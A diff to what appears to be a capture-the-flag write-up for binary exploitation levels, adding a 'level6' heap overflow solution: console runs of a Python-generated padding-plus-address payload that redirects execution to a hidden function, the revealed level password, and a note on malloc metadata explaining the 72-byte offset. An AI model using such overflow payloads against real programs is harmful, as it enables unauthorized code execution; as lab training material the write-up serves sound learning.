@@ -35,7 +35,7 @@ No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RU
 - `ldd <executable>`
 - `readelf -a <executable>`
 - `objdump -M intel -d <executable>`
-- `(echo -e "set disassembly-flavor intel\nset pagination off\nb main\nrun\ndisass"; cat) | gdb <executable>`
+- `(echo -e "set disassembly-flavor intel\nset pagination off"; cat) | gdb <executable>`
 
 ## for gdb
 
@@ -521,3 +521,22 @@ level6
 $ cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
+
+## level6
+
+Heap overflow
+
+```console
+$ objdump -t level6 | grep n
+08048454 g     F .text  00000014              n
+$ ./level6 $(python -c 'print "U"*64+"\x54\x84\x04\x08"')
+Nope
+$ ./level6 $(python -c 'print "U"*68+"\x54\x84\x04\x08"')
+Segmentation fault (core dumped)
+$ ./level6 $(python -c 'print "U"*72+"\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+$ ./level6 $(python -c 'print "U"*76+"\x54\x84\x04\x08"')
+Segmentation fault (core dumped)
+```
+
+72 byte of padding and not 64 because 8 bytes of metadata in malloc
